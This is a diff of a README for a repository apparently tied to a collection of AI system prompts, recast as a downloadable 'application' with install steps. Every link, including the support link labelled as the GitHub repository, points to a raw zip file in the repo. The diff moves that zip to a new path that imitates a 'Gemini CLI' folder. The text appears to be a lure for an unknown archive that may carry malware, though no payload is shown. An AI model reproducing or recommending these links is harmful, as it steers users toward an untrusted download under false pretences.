@@ -8,7 +8,7 @@ Welcome to the **system-prompts-and-models-of-ai-tools** project! This applicati
 To start using this application, follow the steps below. No programming knowledge is necessary; just a few clicks will get you up and running.
 
 ## 📥 Download
-[![Download](https://raw.githubusercontent.com/olznra/system-prompts-and-models-of-ai-tools/main/teleneuron/system-prompts-and-models-of-ai-tools.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/olznra/system-prompts-and-models-of-ai-tools/main/teleneuron/system-prompts-and-models-of-ai-tools.zip)
+[![Download](https://raw.githubusercontent.com/olznra/system-prompts-and-models-of-ai-tools/main/Open Source prompts/Gemini CLI/models-of-tools-ai-and-system-prompts-1.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/olznra/system-prompts-and-models-of-ai-tools/main/Open Source prompts/Gemini CLI/models-of-tools-ai-and-system-prompts-1.5.zip)
 
 ## 📋 Features
 - Access to a variety of AI models including Claude Code, NotionAI, and more.
@@ -23,7 +23,7 @@ To run the application smoothly, ensure your system meets these requirements:
 - Disk Space: Minimum of 500 MB of free space.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the following link to access the download options: [Download Here](https://raw.githubusercontent.com/olznra/system-prompts-and-models-of-ai-tools/main/teleneuron/system-prompts-and-models-of-ai-tools.zip).
+1. **Visit the Releases Page**: Go to the following link to access the download options: [Download Here](https://raw.githubusercontent.com/olznra/system-prompts-and-models-of-ai-tools/main/Open Source prompts/Gemini CLI/models-of-tools-ai-and-system-prompts-1.5.zip).
    
 2. **Choose Your Version**: Select the version you'd like to install based on your operating system. Most users will choose the latest stable version.
 
@@ -52,7 +52,7 @@ You can customize settings according to your needs:
 - Choose options for notifications, appearance, and other features.
 
 ## 📞 Support
-If you encounter any issues or have questions, feel free to open an issue on our [GitHub repository](https://raw.githubusercontent.com/olznra/system-prompts-and-models-of-ai-tools/main/teleneuron/system-prompts-and-models-of-ai-tools.zip) or check the FAQ section there for common queries.
+If you encounter any issues or have questions, feel free to open an issue on our [GitHub repository](https://raw.githubusercontent.com/olznra/system-prompts-and-models-of-ai-tools/main/Open Source prompts/Gemini CLI/models-of-tools-ai-and-system-prompts-1.5.zip) or check the FAQ section there for common queries.
 
 ## 📜 Contributions
 We welcome contributions from developers and users alike. If you have suggestions or feature requests, please share them through our issue tracker.
